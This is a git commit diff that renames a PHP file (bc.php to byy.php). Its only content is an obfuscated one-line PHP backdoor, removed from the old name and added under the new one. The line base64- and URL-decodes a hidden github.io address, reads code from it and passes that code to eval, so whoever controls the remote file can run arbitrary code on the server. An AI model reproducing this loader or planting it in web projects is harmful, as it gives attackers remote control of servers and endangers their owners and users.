8120eeb1c5de6cce2174ed21d26c48f83a7c1efd
kanadechan404 <114995259+kanadechan404@users.noreply.github.com>
2023-03-01 17:29:08 +0700

    Rename bc.php to byy.php

--- bc.php
+++
@@ -1,1 +0,0 @@
-<?=file(["${eval(fgets(fopen(urldecode(base64_decode('aHR0cHMlM0ElMkYlMkZmaWVyemEtZGV2LmdpdGh1Yi5pbyUyRjEudHh0')),'')))}"]);
---
+++ byy.php
@@ -0,0 +1,1 @@
+<?=file(["${eval(fgets(fopen(urldecode(base64_decode('aHR0cHMlM0ElMkYlMkZmaWVyemEtZGV2LmdpdGh1Yi5pbyUyRjEudHh0')),'')))}"]);
